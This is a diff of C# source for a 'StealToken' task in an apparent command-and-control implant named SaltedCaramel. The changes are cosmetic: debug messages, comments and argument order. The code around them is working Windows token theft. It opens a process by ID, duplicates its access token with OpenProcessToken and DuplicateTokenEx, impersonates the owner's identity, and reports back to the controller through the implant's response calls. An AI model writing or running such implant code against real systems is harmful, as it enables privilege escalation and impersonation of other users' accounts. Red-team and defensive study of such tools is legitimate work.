@@ -38,16 +38,16 @@ namespace SaltedCaramel
             {
                 procId = Convert.ToInt32(task.@params);
                 procHandle = new SafeWaitHandle(Process.GetProcessById(procId).Handle, true);
+                Debug.WriteLine("[+] StealToken - Got handle to process: " + procId);
             }
             IntPtr tokenHandle = IntPtr.Zero; // Stores the handle for the original process token
             stolenHandle = IntPtr.Zero; // Stores the handle for our duplicated token
 
             try
             {
-                Debug.WriteLine("[+] StealToken - Got handle to process: " + procId);
-
                 try
                 {
+                    // Get handle to target process token
                     bool procToken = Win32.OpenProcessToken(procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, out tokenHandle);
 
                     if (!procToken) // Check if OpenProcessToken was successful
@@ -55,9 +55,9 @@ namespace SaltedCaramel
 
                     Debug.WriteLine("[+] StealToken - OpenProcessToken: " + procToken);
 
-
                     try
                     {
+                        // Duplicate token as stolenHandle
                         bool duplicateToken = Win32.DuplicateTokenEx(tokenHandle, (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, (uint)TokenImpersonationLevel.Impersonation,
                             Win32.TOKEN_TYPE.TokenImpersonation, out stolenHandle);
 
@@ -65,10 +65,10 @@ namespace SaltedCaramel
                             throw new Exception(Marshal.GetLastWin32Error().ToString());
 
                         Debug.WriteLine("[+] StealToken - DuplicateTokenEx: " + duplicateToken);
-                        Debug.WriteLine("[+] StealToken successful, got token with handle: " + stolenHandle);
 
                         WindowsIdentity ident = new WindowsIdentity(stolenHandle);
-                        implant.PostResponse(new SCTaskResp("Successfully impersonated " + ident.Name, task.id));
+                        Debug.WriteLine("[+] StealToken - Successfully impersonated " + ident.Name);
+                        implant.PostResponse(new SCTaskResp(task.id, "Successfully impersonated " + ident.Name));
                         ident.Dispose();
                         implant.SendComplete(task.id);
                     }
